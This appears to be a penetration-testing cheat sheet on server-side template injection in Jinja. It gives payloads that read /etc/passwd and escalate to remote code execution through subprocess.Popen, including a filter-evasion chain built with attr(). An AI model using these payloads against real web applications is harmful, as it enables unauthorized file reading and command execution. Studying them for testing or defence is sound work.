# SSTI Tips
## Jinja
* This targets templating engines such as Jinja(Python)
* Common delimiters to start
    * Expression
        * `{{ }}`
    * Statement
        * `{% %}`
* Some templating engines contain direct classes to execute system-level calls while others make it more difficult, requiring creative exploits.
* XSS vulnerabilities might also hint at an SSTI vulnerability
    * It is the same case
        * user-provided code entering an unsanitized field
* Discovery
    * Common discoveries to be entered in the fields
        * `{{ 7*7 }}`
            * vuln: `49`
* Common payload that may lead to RCE
    * Jinja
        * Python 2.x
            * `{{ ''.__class__.__mro__[2].__subclasses()[40]('/etc/passwd').read() }}`
                * `''` or `""` is an empty string
                * `.__class__` is asking for the class of it
                * `.__mro__` asking for the Method Resolution Order (tuple of classes)
                    * i.e.
                        ```python
                        >>> Strawberry.__mro__
                        (<class '__main__.Martini'>, <class '__main__.Alcohol'>, <class '__main__.Drinks'>,
                        <class 'object'>)
                        ```
                    * Python 2
                    * `[2]` choosing the 2nd tuple which is `<type 'object'>`
                    * Python 3
                    * `[1]`
                * `.__subclasses__` returns the sub classes of the specific value that the `mro` returned above
                * `[40]` 40th, which in Python 2 is `<type 'file'>`
                * `('/etc/passwd')` value of `file` to `.read()`
        * Filter and Evasion
            * `attr()`
                * Sample
                    ```python
                    {% set foo = "foo" %}
                    {% set bar = "bar" %}
                    {% set foo.bar = "A really different value" %}
                    {{ foo|attr(bar) }}
                    ```
                * For Jinja exploit (case where `.__` is not allowed or filtered)
                    * Sample for this:
                        ```python
                        {% set string = "ssti" %}
                        {% set class = "__class__" %}
                        {% set mro = "__mro__" %}
                        {% set subclasses = "__subclasses__" %}
                        ```
                    * then to this: (remember it is mro `[1]` for Python 3)
                        ```python
                        {% set string = "ssti" %}
                        {% set class = "__class__" %}
                        {% set mro = "__mro__" %}
                        {% set subclasses = "__subclasses__" %}
                        {% set mro_r = string|attr(class)|attr(mro) %}
                        {{ mro_r[1] }} 
                        ```
                    * In this step, within the subclasses() classes, you must find the `subprocess.Popen` as this enables RCE.
                    * It is **IMPORTANT** to note that you must manually look for the `subprocess.Popen` class for the query above (`mro[1]`) since it possibly changes for every instance/spawn/restart of the web app service or whatever is hosting the Jinja2 platform. It should now look like this: (where `[420]` possibly changes every time the service is restarted)
                        ```python
                        {% set string = "ssti" %}
                        {% set class = "__class__" %}
                        {% set mro = "__mro__" %}
                        {% set subclasses = "__subclasses__" %}
                        {% set mro_r = string|attr(class)|attr(mro) %}
                        {% set subclasses_r = mro_r[1]|attr(subclasses)() %}
                        {{ subclasses_r[420] }}
                        ```
                    * to make for full RCE: (where `[420]` possibly changes every time the service is restarted)
                        ```python
                        {% set string = "ssti" %}
                        {% set class = "__class__" %}
                        {% set mro = "__mro__" %}
                        {% set subclasses = "__subclasses__" %}
                        {% set mro_r = string|attr(class)|attr(mro) %}
                        {% set subclasses_r = mro_r[1]|attr(subclasses)() %}
                        {{ subclasses_r[420](["/usr/bin/touch","/tmp/PoC_Write.txt"]) }}
                        ```
